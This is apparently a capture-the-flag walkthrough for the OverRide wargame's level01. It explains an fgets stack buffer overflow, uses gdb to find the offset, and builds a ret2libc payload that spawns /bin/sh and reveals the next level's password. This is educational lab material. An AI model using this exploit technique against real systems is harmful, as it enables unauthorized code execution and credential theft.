# OverRide — Level01 Walkthrough

## Binary Analysis

The program stores the username in a global buffer and checks it against `dat_wil`.

If the username is correct, it asks for a password. The password is read with `fgets()` into a 64-byte stack buffer, but the function allows up to 100 bytes, which creates a stack overflow.

Decompiled logic:

```c
char a_user_name[0x100]; // 256 bytes

int verify_user_name() {
    puts("verifying username....\n");
    return strncmp("dat_wil", a_user_name, 7);
}

int verify_user_pass(char *password) {
    return strncmp("admin", password, 5);
}

int main() {
    char buffer[0x40];
    int ret = 0;

    memset(buffer, 0, 0x40);

    puts("********* ADMIN LOGIN PROMPT *********");
    printf("Enter Username: ");
    fgets(a_user_name, 0x100, stdin);

    ret = verify_user_name();
    if (ret) {
        puts("nope, incorrect username...\n");
        return 1;
    }

    puts("Enter Password: ");
    fgets(buffer, 0x64, stdin);
    ret = verify_user_pass(buffer);
    if (ret || !ret) {
        puts("nope, incorrect password...\n");
        return 1;
    }

    return 0;
}
```

## Vulnerability

The password buffer is only 64 bytes long, but `fgets()` accepts up to 100 bytes. That allows us to overwrite the return address and redirect execution.

## Finding the EIP Offset

To find the offset, a cyclic pattern was used:

https://wiremask.eu/tools/buffer-overflow-pattern-generator/

Example with `gdb`:

```bash
level01@OverRide:~$ gdb ./level01
(gdb) r
Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

The value `0x37634136` corresponds to an offset of **80 bytes**.

## Building the Exploit

This is a classic ret2libc attack. We need the addresses of `system()` and the string `/bin/sh`.

### `system()` address

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

### `/bin/sh` address

```bash
(gdb) info sharedlibrary
From        To      Syms Read   Shared Object Library
0xf7fdc820  0xf7ff501f  Yes (*)     /lib/ld-linux.so.2
0xf7e42f70  0xf7f7633c  Yes (*)     /lib32/libc.so.6

(gdb) find 0xf7e42f70, +99999999, "/bin/sh"
0xf7f897ec
```

## Final Payload

```bash
(python -c 'print "dat_wil"'; python -c 'print "A" * 80 + "\xd0\xae\xe6\xf7" + "\x00\x00\x00\x00" + "\xec\x97\xf8\xf7"'; cat) | ./level01
```

This payload uses:

- `80` bytes of padding,
- the address of `system()`,
- a fake return address,
- the address of `"/bin/sh"`.

## Result

```bash
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

The shell is spawned as `level02`, and the next password is recovered.
